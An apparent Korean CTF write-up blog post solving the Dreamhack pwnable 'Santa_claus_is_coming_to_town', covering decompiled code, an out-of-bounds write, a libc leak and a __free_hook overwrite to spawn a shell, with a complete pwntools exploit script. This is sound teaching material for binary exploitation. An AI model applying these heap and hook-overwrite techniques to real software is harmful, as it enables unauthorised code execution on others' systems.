---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN Santa_claus_is_coming_to_town."
excerpt: "드림핵 포너블 Santa_claus_is_coming_to_town. 문제풀이"
tags: [Dreamhack, pwnable, ctf, writeup]
math: true
date: 2023-02-04 09:30
---

22년도 드림핵에서 진행된 크리스마스 CTF Santa_claus_is_coming_to_town 문제 풀이를 올려보려고 한다. 사실 writeup을 문제풀고 바로 적어야지 내가 했던 삽질들과 어떤 방법으로 접근했는지 적을 수 있는데 시간이 좀 지난 시점이라 이러한 부분이 아쉬울 수 있을것 같다.


일단 문제를 다운 받으면 도커 컨테이너 설정을 위한 도커 파일과 바이너리, 더미 플레그가 존재한다. 우선 도커파일에 정의되어 있는 이미지를 다운받아 살펴보니 ubuntu 18.04버전인 것을 확인했다. libc가 따로 주어지지 않았는데 우분투 18.04버전 libc와 동일했다. 따라서 분석용 도커 컨테이너에 볼륨을 주어 문제를 풀었다.

---

일단 소스코드가 주어지지 않아 기드라를 통해 코드를 디컴파일 해봤다. 아래는 디컴파일 된 main함수이다.
```c
void main(EVP_PKEY_CTX *param_1)

{
  void *pvVar1;
  undefined8 uVar2;
  long in_FS_OFFSET;
  int local_1c0;
  int local_1bc;
  long local_1b8;
  long local_1b0;
  int local_1a8 [2];
  void *apvStack_1a0 [50];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  init(param_1);
  local_1c0 = 0;
  local_1bc = 0;
  local_1b8 = 0;
  local_1b0 = 0;
  memset(local_1a8,0,400);
  intro();
  while( true ) {
    while( true ) {
      print_menu();
      local_1c0 = 0;
      __isoc99_scanf(&DAT_001011a1,&local_1c0);
      if (local_1c0 != 2) break;
      local_1bc = check_offset();
      if (local_1bc != 0) {
        if (local_1a8[(long)local_1bc * 4] == 0) {
          puts("You haven\'t written yet.");
        }
        else {
          printf("\nPages : %p\n",apvStack_1a0[(long)local_1bc * 2]);
          printf("Contents : %s",apvStack_1a0[(long)local_1bc * 2]);
        }
      }
    }
    if (local_1c0 == 3) break;
    if (local_1c0 == 1) {
      local_1bc = check_offset();
      if (local_1bc != 0) {
        if (local_1bc == local_1a8[(long)local_1bc * 4]) {
          puts("You already wrote.");
        }
        else {
          local_1a8[(long)local_1bc * 4] = local_1bc;
          printf("How many lines will to write? (1 line = 16 words) : ");
          __isoc99_scanf(&DAT_001019ed,&local_1b8);
          local_1a8[(long)local_1bc * 4 + 1] = (int)local_1b8;
          pvVar1 = malloc(local_1b8 << 4);
          apvStack_1a0[(long)local_1bc * 2] = pvVar1;
          puts("\n~~~~~~~~~~contents~~~~~~~~~~");
          read(0,apvStack_1a0[(long)local_1bc * 2],local_1b8 * 0x10 - 1);
        }
      }
    }
    else {
      puts("Wrong input");
    }
  }
  uVar2 = santa_came((long)local_1a8);
  if ((int)uVar2 == 0) {
    puts("Santa Claus just left...");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Santa Claus : Oh... You\'re such an honest kid.");
  puts("Santa Claus : Tell me if you have any memories you want to change and erase in this year.");
  local_1bc = check_offset();
  if (local_1bc == 0) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  printf("what line you edit : ");
  __isoc99_scanf(&DAT_001019ed,&local_1b0);
  if (-1 < local_1b0) {
    printf("Change memories to : ");
    read(0,(void *)((long)apvStack_1a0[(long)local_1bc * 2] + (local_1b0 + -1) * 0x10),0x10);
    free(apvStack_1a0[(long)local_1bc * 2]);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Wrong input");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

바이너리를 실행하면, 산타가 뭘 어쩌고 주륵 나온 다음 이후 각 번호에 따라 어떤 작업을 실행할지 고르는 부분이 나온다. 1번을 선택하면 날자와 입력할 텍스트의 크기, 텍스트를 입력받는다. 2번을 선택하면 1번에서 입력한 일자 중 하나의 일자를 골라 텍스트가 존재하는 메모리 주소와 텍스트 내용을 출력한다.

```c
...생략...
I think he will cheat on my diary!!!
But i didn't write a diary this month.
Can you help me?

1. Write diary
2. Read diary
3. Go to sleep
>> 1
What date is it? : 1
How many lines will to write? (1 line = 16 words) : 1000

~~~~~~~~~~contents~~~~~~~~~~
/bin/sh

1. Write diary
2. Read diary
3. Go to sleep
>> 2
What date is it? : 1

Pages : 0x55c89d56a260
Contents : /bin/sh

1. Write diary
2. Read diary
3. Go to sleep
>> 
```

디컴파일한 main함수를 잘 살펴보면 3번을 선택했을 때 조건에 따라 다른 기능을 수행하는 부분이 있다. santa_came() 함수에서 기존에 작성한 메시지의 갯수를 검사해 24개보다 작으면 exit() 함수를 호출해 종료한다.

24 이상인 경우 check_offset() 함수를 통해 날짜를 물어본다. 이부분에서 0보다 크로 25보다 작은 값을 입력하면 해당 함수를 끝내고 다음으로 넘어간다. 이후 수정하고자 하는 라인을 입력받고 read함수를 이용해 수정한다. 그 다음으로 위에서 물어본 날짜의 지점을 free 함수를 통해 메모리 해제를 진행한다.

간단하게 말로 설명했지만 어셈과 동적 디버딩을 통해 직접 코드를이해하는 편이 바람직 하다. 여기서 봐야할 점은 check_offset() 이후 부분이다. 수정하기 위한 값을 입력받는 부분에서 검증이 미흡해 작성한 라인 수보다 더 큰 값을 넣을 수 있고 이를 통해 결과적으로 read함수를 이용해 값을 쓰는 코드에서 Out Of Bound 취약점이 발생한다. read 이후 free를 통해 메모리를 해제하는 과정을 거치게 되는데 여기서 free hook 취약점을 이용해 풀어보려 한다.

free hook 취약점은 기존 free함수가 동작하기 전 디버깅 목적으로 존재하는 기능인데 메모리 상의 free hook에 함수 주소가 존재하면 free 하기 전에 함수를 free하고자 하는 대상을 인자로 받아 실행한다. 이러한 hook취약점은 free뿐만 아니라 malloc 같은 함수에서도 발생한다.

---

여기서 한가지 트릭을 이용해 익스플로잇 할 예정이다. malloc을 통해 할당된 메모리는 heap영역에 할당된다. 우리가 익스코드를 작성할떄 heap주소에서 스택이나 libc주소 까지 음수 값 때문에 계산이 안되거나 너무 큰 수를 넘어야 하는 경우가 있다. 이럴 때 heap크기를 무작정 키워보면 편하다. heap과 libc의 거리는 큰 차이가 있지만 heap chunk보다 큰 값을 요청하면 libc 바로 위의 메모리에 공간을 따로 할당해 주기 때문에 익스플로잇 하기 더 수월하다. 이를 직접 살펴보자.

아래 예시는 문제 바이너리에 /bin/sh 문자열을 넣고 malloc 할당 크기만 다르게 하여 gdb로 확인한 것이다. 기존의 malloc이 heap chunk 안에서 할당된 경우는 다음과 같다.

```c
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x55d737600000     0x55d737602000 r-xp     2000      0 /home/santa_coming_to_town
    0x55d737801000     0x55d737802000 r--p     1000   1000 /home/santa_coming_to_town
    0x55d737802000     0x55d737803000 rw-p     1000   2000 /home/santa_coming_to_town
    0x55d739403000     0x55d739424000 rw-p    21000      0 [heap]
    0x7fbabe0ba000     0x7fbabe2a1000 r-xp   1e7000      0 /home/libc.so.6
    0x7fbabe2a1000     0x7fbabe4a1000 ---p   200000 1e7000 /home/libc.so.6
    0x7fbabe4a1000     0x7fbabe4a5000 r--p     4000 1e7000 /home/libc.so.6
    0x7fbabe4a5000     0x7fbabe4a7000 rw-p     2000 1eb000 /home/libc.so.6
    0x7fbabe4a7000     0x7fbabe4ab000 rw-p     4000      0 [anon_7fbabe4a7]
    0x7fbabe4ab000     0x7fbabe4d4000 r-xp    29000      0 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fbabe6d2000     0x7fbabe6d4000 rw-p     2000      0 [anon_7fbabe6d2]
    0x7fbabe6d4000     0x7fbabe6d5000 r--p     1000  29000 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fbabe6d5000     0x7fbabe6d6000 rw-p     1000  2a000 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fbabe6d6000     0x7fbabe6d7000 rw-p     1000      0 [anon_7fbabe6d6]
    0x7ffcd9a9e000     0x7ffcd9abf000 rw-p    21000      0 [stack]
    0x7ffcd9bdd000     0x7ffcd9be1000 r--p     4000      0 [vvar]
    0x7ffcd9be1000     0x7ffcd9be3000 r-xp     2000      0 [vdso]
  0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]

pwndbg> x/32s 0x55d739403260
0x55d739403260: "/bin/sh"
```

위와 같이 heap과 libc의 주소차이가 큰것을 볼 수 있다. 다음으로 아래는 heap chunk보다 큰 값을 malloc 한 경우다.

```c
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555639800000     0x555639802000 r-xp     2000      0 /home/santa_coming_to_town
    0x555639a01000     0x555639a02000 r--p     1000   1000 /home/santa_coming_to_town
    0x555639a02000     0x555639a03000 rw-p     1000   2000 /home/santa_coming_to_town
    0x55563a6a5000     0x55563a6c6000 rw-p    21000      0 [heap]
    0x7fe0f3f56000     0x7fe0f4136000 rw-p   1e0000      0 [anon_7fe0f3f56]
    0x7fe0f4136000     0x7fe0f431d000 r-xp   1e7000      0 /home/libc.so.6
    0x7fe0f431d000     0x7fe0f451d000 ---p   200000 1e7000 /home/libc.so.6
    0x7fe0f451d000     0x7fe0f4521000 r--p     4000 1e7000 /home/libc.so.6
    0x7fe0f4521000     0x7fe0f4523000 rw-p     2000 1eb000 /home/libc.so.6
    0x7fe0f4523000     0x7fe0f4527000 rw-p     4000      0 [anon_7fe0f4523]
    0x7fe0f4527000     0x7fe0f4550000 r-xp    29000      0 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe0f456e000     0x7fe0f4750000 rw-p   1e2000      0 [anon_7fe0f456e]
    0x7fe0f4750000     0x7fe0f4751000 r--p     1000  29000 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe0f4751000     0x7fe0f4752000 rw-p     1000  2a000 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe0f4752000     0x7fe0f4753000 rw-p     1000      0 [anon_7fe0f4752]
    0x7ffdf0e5f000     0x7ffdf0e80000 rw-p    21000      0 [stack]
    0x7ffdf0f4e000     0x7ffdf0f52000 r--p     4000      0 [vvar]
    0x7ffdf0f52000     0x7ffdf0f54000 r-xp     2000      0 [vdso]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]

pwndbg> x/16s 0x7fe0f3f56000
0x7fe0f3f56000: ""
0x7fe0f3f56001: ""
0x7fe0f3f56002: ""
0x7fe0f3f56003: ""
0x7fe0f3f56004: ""
0x7fe0f3f56005: ""
0x7fe0f3f56006: ""
0x7fe0f3f56007: ""
0x7fe0f3f56008: "\002\200\002"
0x7fe0f3f5600c: ""
0x7fe0f3f5600d: ""
0x7fe0f3f5600e: ""
0x7fe0f3f5600f: ""
0x7fe0f3f56010: "/bin/sh"
0x7fe0f3f56018: ""
0x7fe0f3f56019: ""
```

기존과 다르게 anon_7fe0f3f56라는 메모리에 문자열이 들어있으며 libc 바로 위에 위치하는것을 볼 수 있다.

---

익스플로잇 코드를 간단히 설명해보겠다. 우선 /bin/sh라는 문자열을 24번 write한다. 이후 2번 메뉴를 통해 24번쨰 글을 출력해서 해당 문자열이 위치한 주소를 얻은다음 libc까지의 offset을 구해 libc 주소를 leak 한다. 이렇게 libc주소를 구하면 offset 계산을 통해 free_hook, system 함수를 사용할 수 있다.

이후 3번 메뉴를 들어가면 오늘 날짜를 물어본다. 24일이라고 답을 하면 어떤 라인을 수정할 것인지 물어본다. 기드라를 통해 확인해 본 결과 직전에 물어본 오늘 날짜의 대한 문자열이 저장되는 메모리 주소에서 입력받은 숫자에 0x10e곱하고 0x1를 뺀 값을 더한 위치에 값을 read 한다. 따라서 libc_base + free_hook_offset에서  2번 메뉴를 통해 출력된 주소를 뺀 값을 입력하면 free hook에 접근 할 수 있다.

이제 어떤 값을 쓸 것인지 물어본다. 이 부분에는 system 함수의 주소를 넣어주면 이후 free함수의 인자로 주어진 메모리 영역의 문자열을 인자 삼아서 free함수 보다 free_hook이 먼저 실행된다. 그럼 결과적으로 24번째 메모리에 들어있는 /bin/sh를 인자로 하여 system 함수가 실행되기 때문에 shell을 얻을 수 있다.

free_hook을 오버라이트 하는 도중 계속 실패해서 gdb를 통해 찍어봤는데
```python
c.sendafter(b"to : ", p64(system))
```
위 코드를 이용하면 free_hook-0x8의 위치에 system주소가 들어가는것을 확인했다. 따라서 이를 다음과 같이 수정했다.
```python
c.sendafter(b"to : ", p64(system)*2)
```

최종 익스플로잇 코드는 다음과 같다.
```python
from pwn import *
context.update(arch='amd64', os='linux')
#c = remote("host3.dreamhack.games", 19538)
c = process("./santa_coming_to_town")
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

for i in range(1, 25):
    c.sendlineafter(b">> ", b"1")
    c.sendlineafter(b"? : ", str(i))
    c.sendlineafter(b") : ", b"10000")
    c.sendafter(b"~~~~~~~~~~contents~~~~~~~~~~\n", b"/bin/sh\x00")
    print("\rfor : "+str(i), end="")
    #print("for : "+ str(i))
print("\n")

c.sendlineafter(b">> ", b"2")
c.sendlineafter(b": ", b"24")
c.recvuntil(b"Pages : ")

leak = int(str(c.recvuntil(b"\n"))[2:-3], 16)
print("leak : "+hex(leak))
offset = 0x1DFFF0
libcAddr = leak+offset
system = libcAddr+libc.sym['system']

print("libc addr : "+hex(libcAddr))
print("system addr : "+hex(system))
#pause()
#프리훅 오버라이트, 원샷 가젯
freeHookOffset = libc.sym["__free_hook"]
freeHook = libcAddr + freeHookOffset
print("__free_hook address : "+hex(freeHook))

pause()

heapToFreehook = int((int(hex(freeHook), 16)-leak)/0x10)+0x1
print("heapToFreehook :" + hex(heapToFreehook))

c.sendlineafter(b">> ", b"3")
c.sendlineafter(b"it? : ", b"24")
c.sendlineafter(b"edit : ", str(heapToFreehook))
c.sendafter(b"to : ", p64(system)*2)
print("system addr : "+ hex(system*2))

c.interactive()
```